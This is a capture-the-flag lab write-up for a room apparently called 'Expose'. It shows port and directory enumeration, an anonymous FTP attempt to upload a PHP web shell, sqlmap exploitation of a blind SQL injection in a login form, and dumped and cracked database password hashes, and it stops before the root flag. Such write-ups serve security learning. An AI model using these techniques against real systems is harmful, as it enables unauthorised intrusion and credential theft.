# Expose

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

### What is the user flag?

## Enumerate The Server

```text
:> nmap -Pn -sV 10.10.183.68
```

21/tcp open ftp vsftpd 2.0.8 or later

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux)

```text
:>sudo nmap -T5 -p1000-2000 10.10.183.68
```

## Port State Service

1337/tcp open waste

1883/tcp open mqtt

```text
:>sudo nmap 10.10.183.68 -sV -p 1337,1883
```

## Port State Service Version

1337/tcp open http Apache httpd 2.4.41 ((Ubuntu))

1883/tcp open mosquitto version 1.6.9

## Enumerate The Web Ports

- visit the portals and find a webpage on port 1337

```text
:>gobuster dir -u http://10.10.183.68:1337 -w /usr/share/wordlists/dirb/common.txt
```

Starting gobuster in directory enumeration mode

```text
===============================================================
```

/.htpasswd (Status: 403) [Size: 279]

/.hta (Status: 403) [Size: 279]

/.htaccess (Status: 403) [Size: 279]

/admin (Status: 301) [Size: 319] [--> http://10.10.183.68:1337/admin/] // No actual functionality

/index.php (Status: 200) [Size: 91]

/javascript (Status: 301) [Size: 324] [--> http://10.10.183.68:1337/javascript/]

/phpmyadmin (Status: 301) [Size: 324] [--> http://10.10.183.68:1337/phpmyadmin/]

/server-status (Status: 403) [Size: 279]

Progress: 4614 / 4615 (99.98%)

## Enumerate With Bigger List

```text
:> dirb http://10.10.191.134:1337/ /usr/share/wordlists/dirb/big.txt
```

- Scanning URL: http://10.10.191.134:1337/ ----

==> DIRECTORY: http://10.10.191.134:1337/admin/

==> DIRECTORY: http://10.10.191.134:1337/admin_101/ // functionality discovered

==> DIRECTORY: http://10.10.191.134:1337/javascript/

==> DIRECTORY: http://10.10.191.134:1337/phpmyadmin/

+ http://10.10.191.134:1337/server-status (CODE:403|SIZE:280)

## Connect To Vsftpd Server

```text
:> ftp 10.10.183.68
```

- supports anonymous login with username "anonymous" and no password

- copy php shell from /usr/share/webshells

- edit the file

```text
:> put /home/kali/Documents/myShell.php
```

- Permission Denied

SCAN THE LOGIN PAGE USING Burp Suite and MYSQL

//Open the admin portal in burpsuites's browswer

//attempt generic login with credentials and identify the

//paramters: "email=hacker%40root.html&password=password123"

//method: "POST /admin_101/includes/user_login.php HTTP/1.1"

//send the request to the repeater

//in Repeater, use "save item" in the cnotext menu as "thmExposePostRequest"

//////////////////////////////////////////////////////////////

//key data:

POST /admin_101/includes/user_login.php HTTP/1.1

Host: 10.10.88.155:1337

Content-Length: 44

X-Requested-With: XMLHttpRequest

Accept-Language: en-US,en;q=0.9

Accept: */*

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36

Origin: http://10.10.88.155:1337

Referer: http://10.10.88.155:1337/admin_101/

Accept-Encoding: gzip, deflate, br

Cookie: PHPSESSID=4mo80kncre9d4jlu6ss79uc3pb

Connection: keep-alive

email=hacker%40root.thm&password=password123

//////////////////////////////////////////////////////////////

## Enumerate With Mysql

```text
:> sqlmap -r thmExposePostRequest
```

// Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

//[21:20:36] [INFO] the back-end DBMS is MySQL

//web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)

//web application technology: Apache 2.4.41

//back-end DBMS: MySQL >= 5.6

## ATTACK WITH Burp Suite INTRUDER

//Send the original request to Intruder

//create payloads for the email and password parameters

//use sqlmpa.txt for "email" parameter and "rockyou.txt" for "password" parameter

// stopped this because the following parallel effort succeeded first

## Rerun Sqlmap With Additional Parameters

```text
:>sqlmap -r thmExposePostRequest --dbms=MySQL -a
```

///////////////////////

web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)

web application technology: Apache 2.4.41

back-end DBMS operating system: Linux Ubuntu

back-end DBMS: MySQL >= 8.0.0

banner: '8.0.33-0ubuntu0.20.04.2'

database management system users [6]:

[*] 'debian-sys-maint'@'localhost'

[*] 'mysql.infoschema'@'localhost'

[*] 'mysql.session'@'localhost'

[*] 'mysql.sys'@'localhost'

[*] 'phpmyadmin'@'localhost'

[*] 'root'@'localhost'

[21:49:56] [INFO] fetching database users password hashes

[21:49:56] [INFO] retrieved: 'debian-sys-maint'

[21:49:56] [INFO] retrieved: '$A$005$d(eS8%r\x1c.\x12P\x0fw)y\x15X}GMNMOT9DnqlOLF8oIAKogof2f9uB7Bh6JwKj3TLY9T3r4'

[21:49:57] [INFO] retrieved: 'mysql.infoschema'

[21:49:57] [INFO] retrieved: '$A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED'

[21:49:57] [INFO] retrieved: 'mysql.session'

[21:49:57] [INFO] retrieved: '$A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED'

[21:49:57] [INFO] retrieved: 'mysql.sys'

[21:49:57] [INFO] retrieved: '$A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED'

[21:49:58] [INFO] retrieved: 'phpmyadmin'

[21:49:58] [INFO] retrieved: '$A$005$\x1d_]6E*pr.L\x19<G;F>\x11\x086\x175EaBZ6/crQboNnno/crTz.KFRpzZiTpRFtF3So9z/R6'

[21:49:58] [INFO] retrieved: 'root'

[21:49:58] [INFO] retrieved: '*A00C34073A26B40AB4307650BFB9309D6BFA6999'

[21:50:14] [INFO] writing hashes to a temporary file '/tmp/sqlmap5k3zk1sw60574/sqlmaphashes-uvh3zst0.txt'

[21:53:03] [INFO] recognized possible password hashes in column 'password'

[21:53:03] [INFO] writing hashes to a temporary file '/tmp/sqlmap5k3zk1sw60574/sqlmaphashes-cn3fuz24.txt'

+----+-----------------+---------------------+--------------------------------------+

| id | email | created | password |

+----+-----------------+---------------------+--------------------------------------+

| 1 | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |

+----+-----------------+---------------------+--------------------------------------+

## Login To Portal

//with username and password for hacker@root.thm

//worked

//not useful, its just a landing page

//indicates need to log into the database from the command line

## Crack Discovered Passwords

## Step 13: Crack passwords from sqlmaps temporary store

///tmp/sqlmap5k3zk1sw60574/sqlmaphashes-uvh3zst0.txt'

//copied to Documents as hashmap.txt

//appears to be an md5 hash

//try crackstation

root:*A00C34073A26B40AB4307650BFB9309D6BFA6999 (plaintext not found in crackstation

69c66901194a6486176e81f5945b8929 (plaintext: easytohack)

//Use hashes.net to identify the hash

//indicates this is a MySQL4/5 hash, as thought

//able to decrypt:

//root@123

## Enumerate The Standard Mysql Port

```text
:> sudo nmap 10.10.249.51 -p 3306 -Pn -sV
```

// port responds as filtered and cannot be accessed from the attacking machine

```text
:> mysql -h <host address> -u root // will not connect
```

## Visit Phpmyadmin

```text
:> http://<machine address>:1337/phpmyadmin // another login page
```

## ENUMERATE PHPMY ADMIN WITH Burp Suite

// generate the file with bursuite

```text
:> sqlmap -r phpMyAdminY
```

// all tested paratmeters do not appear to be injectable

### What is the root flag?
